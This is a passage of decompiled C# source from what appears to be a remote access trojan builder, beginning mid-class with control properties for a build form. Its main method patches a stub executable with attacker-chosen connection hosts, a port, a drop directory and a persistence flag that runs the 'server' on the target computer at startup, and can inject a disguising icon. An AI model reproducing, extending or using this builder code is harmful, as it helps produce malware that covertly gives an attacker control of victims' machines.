			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.startup_CheckedChanged);
				if (this._startup != null)
				{
					this._startup.CheckedChanged -= value2;
				}
				this._startup = value;
				if (this._startup != null)
				{
					this._startup.CheckedChanged += value2;
				}
			}
		}

		// Token: 0x170002FE RID: 766
		// (get) Token: 0x06000845 RID: 2117 RVA: 0x0004199C File Offset: 0x0003FB9C
		// (set) Token: 0x06000846 RID: 2118 RVA: 0x000049A2 File Offset: 0x00002BA2
		internal virtual Label Label10
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label10;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label10 = value;
			}
		}

		// Token: 0x170002FF RID: 767
		// (get) Token: 0x06000847 RID: 2119 RVA: 0x000419B4 File Offset: 0x0003FBB4
		// (set) Token: 0x06000848 RID: 2120 RVA: 0x000419CC File Offset: 0x0003FBCC
		internal virtual ComboBox dir
		{
			[DebuggerNonUserCode]
			get
			{
				return this._dir;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.dir_SelectedIndexChanged);
				if (this._dir != null)
				{
					this._dir.SelectedIndexChanged -= value2;
				}
				this._dir = value;
				if (this._dir != null)
				{
					this._dir.SelectedIndexChanged += value2;
				}
			}
		}

		// Token: 0x17000300 RID: 768
		// (get) Token: 0x06000849 RID: 2121 RVA: 0x00041A24 File Offset: 0x0003FC24
		// (set) Token: 0x0600084A RID: 2122 RVA: 0x000049AB File Offset: 0x00002BAB
		internal virtual TextBox Exe
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Exe;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Exe = value;
			}
		}

		// Token: 0x17000301 RID: 769
		// (get) Token: 0x0600084B RID: 2123 RVA: 0x00041A3C File Offset: 0x0003FC3C
		// (set) Token: 0x0600084C RID: 2124 RVA: 0x000049B4 File Offset: 0x00002BB4
		internal virtual Label Label11
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label11;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label11 = value;
			}
		}

		// Token: 0x17000302 RID: 770
		// (get) Token: 0x0600084D RID: 2125 RVA: 0x00041A54 File Offset: 0x0003FC54
		// (set) Token: 0x0600084E RID: 2126 RVA: 0x000049BD File Offset: 0x00002BBD
		internal virtual TextBox Host2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Host2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Host2 = value;
			}
		}

		// Token: 0x17000303 RID: 771
		// (get) Token: 0x0600084F RID: 2127 RVA: 0x00041A6C File Offset: 0x0003FC6C
		// (set) Token: 0x06000850 RID: 2128 RVA: 0x000049C6 File Offset: 0x00002BC6
		internal virtual TextBox Host1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Host1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Host1 = value;
			}
		}

		// Token: 0x17000304 RID: 772
		// (get) Token: 0x06000851 RID: 2129 RVA: 0x00041A84 File Offset: 0x0003FC84
		// (set) Token: 0x06000852 RID: 2130 RVA: 0x000049CF File Offset: 0x00002BCF
		internal virtual Label Label14
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label14;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label14 = value;
			}
		}

		// Token: 0x17000305 RID: 773
		// (get) Token: 0x06000853 RID: 2131 RVA: 0x00041A9C File Offset: 0x0003FC9C
		// (set) Token: 0x06000854 RID: 2132 RVA: 0x000049D8 File Offset: 0x00002BD8
		internal virtual TextBox VN
		{
			[DebuggerNonUserCode]
			get
			{
				return this._VN;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._VN = value;
			}
		}

		// Token: 0x17000306 RID: 774
		// (get) Token: 0x06000855 RID: 2133 RVA: 0x00041AB4 File Offset: 0x0003FCB4
		// (set) Token: 0x06000856 RID: 2134 RVA: 0x000049E1 File Offset: 0x00002BE1
		internal virtual GroupDropBox GroupDropBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox3 = value;
			}
		}

		// Token: 0x17000307 RID: 775
		// (get) Token: 0x06000857 RID: 2135 RVA: 0x00041ACC File Offset: 0x0003FCCC
		// (set) Token: 0x06000858 RID: 2136 RVA: 0x000049EA File Offset: 0x00002BEA
		internal virtual GroupDropBox GroupDropBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox2 = value;
			}
		}

		// Token: 0x17000308 RID: 776
		// (get) Token: 0x06000859 RID: 2137 RVA: 0x00041AE4 File Offset: 0x0003FCE4
		// (set) Token: 0x0600085A RID: 2138 RVA: 0x000049F3 File Offset: 0x00002BF3
		internal virtual GroupDropBox GroupDropBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._GroupDropBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._GroupDropBox1 = value;
			}
		}

		// Token: 0x17000309 RID: 777
		// (get) Token: 0x0600085B RID: 2139 RVA: 0x00041AFC File Offset: 0x0003FCFC
		// (set) Token: 0x0600085C RID: 2140 RVA: 0x000049FC File Offset: 0x00002BFC
		internal virtual PictureBox PictureBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox2 = value;
			}
		}

		// Token: 0x1700030A RID: 778
		// (get) Token: 0x0600085D RID: 2141 RVA: 0x00041B14 File Offset: 0x0003FD14
		// (set) Token: 0x0600085E RID: 2142 RVA: 0x00041B2C File Offset: 0x0003FD2C
		internal virtual Button Button2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				if (this._Button2 != null)
				{
					this._Button2.Click -= value2;
				}
				this._Button2 = value;
				if (this._Button2 != null)
				{
					this._Button2.Click += value2;
				}
			}
		}

		// Token: 0x1700030B RID: 779
		// (get) Token: 0x0600085F RID: 2143 RVA: 0x00041B84 File Offset: 0x0003FD84
		// (set) Token: 0x06000860 RID: 2144 RVA: 0x00004A05 File Offset: 0x00002C05
		internal virtual Label Label8
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label8;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label8 = value;
			}
		}

		// Token: 0x1700030C RID: 780
		// (get) Token: 0x06000861 RID: 2145 RVA: 0x00041B9C File Offset: 0x0003FD9C
		// (set) Token: 0x06000862 RID: 2146 RVA: 0x00004A0E File Offset: 0x00002C0E
		internal virtual RichTextBox TT
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TT;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TT = value;
			}
		}

		// Token: 0x06000863 RID: 2147 RVA: 0x00041BB4 File Offset: 0x0003FDB4
		private void Button4_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog
			{
				Filter = "Icon|*.ico",
				Title = "Choose Icon",
				FileName = string.Empty
			};
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				this.IconTextBox.Text = openFileDialog.FileName;
				this.PictureBox1.Image = Image.FromFile(this.IconTextBox.Text);
			}
		}

		// Token: 0x06000864 RID: 2148 RVA: 0x00004A17 File Offset: 0x00002C17
		private void Button3_Click(object sender, EventArgs e)
		{
			this.PictureBox1.Image = null;
			this.IconTextBox.Text = "";
		}

		// Token: 0x06000865 RID: 2149 RVA: 0x00041C24 File Offset: 0x0003FE24
		private void Button1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Button1.Text, "Done", false) == 0)
			{
				this.TT.Visible = false;
				this.GroupDropBox1.Visible = true;
				this.GroupDropBox2.Visible = true;
				this.GroupDropBox3.Visible = true;
				this.Panel2.AutoScroll = true;
				this.Button1.Text = "Build Server";
			}
			else
			{
				SaveFileDialog saveFileDialog = new SaveFileDialog();
				saveFileDialog.Filter = "EXE|*.exe";
				saveFileDialog.FileName = "Server";
				if (saveFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.GroupDropBox1.Visible = false;
					this.GroupDropBox2.Visible = false;
					this.GroupDropBox3.Visible = false;
					this.Panel2.AutoScroll = false;
					this.TT.Visible = true;
					ima.F.sl.Text = "Build started..";
					this.TT.SelectionStart = this.TT.TextLength;
					this.TT.AppendText("==========================================================\r\nBuild started " + DateTime.Now.ToString() + "\r\n==========================================================\r\n");
					try
					{
						AssemblyDefinition assemblyDefinition = AssemblyDefinition.ReadAssembly(Application.StartupPath + "\\Bin\\Stub.stb");
						try
						{
							IEnumerator<TypeDefinition> enumerator = assemblyDefinition.MainModule.GetTypes().GetEnumerator();
							while (enumerator.MoveNext())
							{
								TypeDefinition current = enumerator.Current;
								try
								{
									Collection<MethodDefinition>.Enumerator enumerator2 = current.Methods.GetEnumerator();
									while (enumerator2.MoveNext())
									{
										MethodDefinition current2 = enumerator2.Current;
										if (Operators.CompareString(current2.Name, ".ctor", false) == 0)
										{
											IEnumerator<Instruction> enumerator3 = null;
											try
											{
												enumerator3 = (IEnumerator<Instruction>)current2.Body.Instructions.GetEnumerator();
												while (enumerator3.MoveNext())
												{
													Instruction current3 = enumerator3.Current;
													if (current3.OpCode.Code == Code.Ldstr)
													{
														string left = current3.Operand.ToString();
														if (Operators.CompareString(left, "%NM%", false) == 0)
														{
															TextBox vN = this.VN;
															string text = vN.Text;
															vN.Text = text;
															current3.Operand = text;
														}
														else if (Operators.CompareString(left, "%H1%", false) == 0)
														{
															current3.Operand = this.Host1.Text;
														}
														else if (Operators.CompareString(left, "%H2%", false) == 0)
														{
															current3.Operand = this.Host2.Text;
														}
														else if (Operators.CompareString(left, "%RG%", false) == 0)
														{
															current3.Operand = Fungsi.smethod_0(string.Concat(new string[]
															{
																this.VN.Text,
																this.Host1.Text,
																this.Host2.Text,
																this.Exe.Text,
																this.dir.Text
															}));
														}
														else if (Operators.CompareString(left, "%P%", false) == 0)
														{
															current3.Operand = this.Port.Value.ToString();
														}
														else if (Operators.CompareString(left, "%EXE%", false) == 0)
														{
															current3.Operand = this.Exe.Text;
														}
														else if (Operators.CompareString(left, "%ST%", false) == 0)
														{
															current3.Operand = this.startup.Checked.ToString();
															this.TT.AppendText("Drop file in : " + this.dir.Text + "\r\n");
														}
														else if (Operators.CompareString(left, "%DR%", false) == 0)
														{
															current3.Operand = this.dir.Text.Replace("%", "");
															this.TT.AppendText("Run Server when the target computer starts (On Startup) : " + this.startup.Checked.ToString() + "\r\n");
														}
													}
												}
											}
											finally
											{
												enumerator3.Dispose();
											}
										}
									}
								}
								finally
								{
									Collection<MethodDefinition>.Enumerator enumerator2;
									((IDisposable)enumerator2).Dispose();
								}
							}
						}
						finally
						{
							IEnumerator<TypeDefinition> enumerator;
							if (enumerator != null)
							{
								enumerator.Dispose();
							}
						}
						assemblyDefinition.Write(saveFileDialog.FileName);
						this.TT.AppendText("Server ID : " + this.VN.Text + "\r\n");
						this.TT.AppendText("Primary Connection Host : " + this.Host1.Text + "\r\n");
						this.TT.AppendText("Backup Connection Host : " + this.Host2.Text + "\r\n");
						this.TT.AppendText("RegKey : " + Fungsi.smethod_0(string.Concat(new string[]
						{
							this.VN.Text,
							this.Host1.Text,
							this.Host2.Text,
							this.Exe.Text,
							this.dir.Text
						})) + "\r\n");
						this.TT.AppendText("Connection Port : " + Conversions.ToString(this.Port.Value) + "\r\n");
						this.TT.AppendText("File Name : " + this.Exe.Text + "\r\n");
						if (Operators.CompareString(this.IconTextBox.Text, "", false) != 0)
						{
							Gunakanicon.InjectIcon(saveFileDialog.FileName, this.IconTextBox.Text);
							this.TT.AppendText("Change Icon : " + this.IconTextBox.Text + "\r\n");
						}
						else
						{
							this.TT.AppendText("Change Icon : Nothing \r\n");
						}
						FileInfo fileInfo = new FileInfo(saveFileDialog.FileName);
						ima.F.sl.Text = "Build succeeded..";
						this.TT.AppendText("\r\nBuild Succeeded " + DateTime.Now.ToString() + "\r\n==========================================================\r\n");
						this.TT.ScrollToCaret();
						this.Button1.Text = "Done";
						if (ima.F.SC2.Checked)
						{
							Process.Start(fileInfo.DirectoryName);
						}
					}
					catch (Exception expr_67A)
					{
						ProjectData.SetProjectError(expr_67A);
						ima.F.sl.Text = "Build error..";
						ProjectData.ClearProjectError();
					}
				}
			}
		}

		// Token: 0x06000866 RID: 2150 RVA: 0x00004A35 File Offset: 0x00002C35
		private void dir_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.dir.Text, "%WINDIR%", false) == 0)
			{
				this.PictureBox2.Visible = true;
			}
			else
			{
				this.PictureBox2.Visible = false;
			}
		}

		// Token: 0x06000867 RID: 2151 RVA: 0x00042334 File Offset: 0x00040534
		private void Button2_Click(object sender, EventArgs e)
		{
			this.VN.Text = "Server";
			this.Host1.Text = "127.0.0.1";
			this.Host2.Text = "";
			this.Port.Value = new decimal(1997L);
			this.Exe.Text = "Server.exe";
			this.dir.SelectedIndex = 0;
			this.startup.Checked = true;
			this.IconTextBox.Text = "";
			this.PictureBox1.Image = null;
			this.Exe.Enabled = true;
			this.dir.Enabled = true;
			ima.F.sl.Text = "Default Profile..";
		}

		// Token: 0x06000868 RID: 2152 RVA: 0x000423FC File Offset: 0x000405FC
		private void startup_CheckedChanged(object sender, EventArgs e)
		{
			if (this.startup.Checked)
			{
				this.Exe.Enabled = true;
				this.dir.Enabled = true;
			}
			else
			{
				this.Exe.Enabled = false;
				this.dir.Enabled = false;
			}
		}

		// Token: 0x06000869 RID: 2153 RVA: 0x000048F2 File Offset: 0x00002AF2
		private void PictureBox3_Click(object sender, EventArgs e)
		{
			MyProject.Forms.FrmHelp.Show();
		}

		// Token: 0x040003CA RID: 970
		private static List<WeakReference> __ENCList;

		// Token: 0x040003CB RID: 971
		private IContainer components;

		// Token: 0x040003CC RID: 972
		[AccessedThroughProperty("Panel1")]
		private Panel _Panel1;

		// Token: 0x040003CD RID: 973
		[AccessedThroughProperty("Panel2")]
		private Panel _Panel2;

		// Token: 0x040003CE RID: 974
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x040003CF RID: 975
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x040003D0 RID: 976
		[AccessedThroughProperty("Button4")]
		private Button _Button4;

		// Token: 0x040003D1 RID: 977
		[AccessedThroughProperty("IconTextBox")]
		private TextBox _IconTextBox;

		// Token: 0x040003D2 RID: 978
		[AccessedThroughProperty("Button3")]
		private Button _Button3;

		// Token: 0x040003D3 RID: 979
		[AccessedThroughProperty("Label7")]
		private Label _Label7;

		// Token: 0x040003D4 RID: 980
		[AccessedThroughProperty("PictureBox1")]
		private PictureBox _PictureBox1;

		// Token: 0x040003D5 RID: 981
		[AccessedThroughProperty("Label5")]
		private Label _Label5;

		// Token: 0x040003D6 RID: 982
		[AccessedThroughProperty("Label4")]
		private Label _Label4;

		// Token: 0x040003D7 RID: 983
		[AccessedThroughProperty("Label3")]
		private Label _Label3;

		// Token: 0x040003D8 RID: 984
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x040003D9 RID: 985
		[AccessedThroughProperty("Port")]
		private NumericUpDown _Port;

		// Token: 0x040003DA RID: 986
		[AccessedThroughProperty("Label6")]
		private Label _Label6;

		// Token: 0x040003DB RID: 987
		[AccessedThroughProperty("Label9")]
		private Label _Label9;

		// Token: 0x040003DC RID: 988
		[AccessedThroughProperty("startup")]
		private CheckBox _startup;

		// Token: 0x040003DD RID: 989
		[AccessedThroughProperty("Label10")]
		private Label _Label10;

		// Token: 0x040003DE RID: 990
		[AccessedThroughProperty("dir")]
		private ComboBox _dir;

		// Token: 0x040003DF RID: 991
		[AccessedThroughProperty("Exe")]
		private TextBox _Exe;

		// Token: 0x040003E0 RID: 992
		[AccessedThroughProperty("Label11")]
		private Label _Label11;

		// Token: 0x040003E1 RID: 993
		[AccessedThroughProperty("Host2")]
		private TextBox _Host2;

		// Token: 0x040003E2 RID: 994
		[AccessedThroughProperty("Host1")]
		private TextBox _Host1;

		// Token: 0x040003E3 RID: 995
		[AccessedThroughProperty("Label14")]
		private Label _Label14;

		// Token: 0x040003E4 RID: 996
		[AccessedThroughProperty("VN")]
		private TextBox _VN;

		// Token: 0x040003E5 RID: 997
		[AccessedThroughProperty("GroupDropBox3")]
		private GroupDropBox _GroupDropBox3;

		// Token: 0x040003E6 RID: 998
		[AccessedThroughProperty("GroupDropBox2")]
		private GroupDropBox _GroupDropBox2;

		// Token: 0x040003E7 RID: 999
		[AccessedThroughProperty("GroupDropBox1")]
		private GroupDropBox _GroupDropBox1;

		// Token: 0x040003E8 RID: 1000
		[AccessedThroughProperty("PictureBox2")]
		private PictureBox _PictureBox2;

		// Token: 0x040003E9 RID: 1001
		[AccessedThroughProperty("Button2")]
		private Button _Button2;

		// Token: 0x040003EA RID: 1002
		[AccessedThroughProperty("Label8")]
		private Label _Label8;

		// Token: 0x040003EB RID: 1003
		[AccessedThroughProperty("TT")]
		private RichTextBox _TT;
	}
}
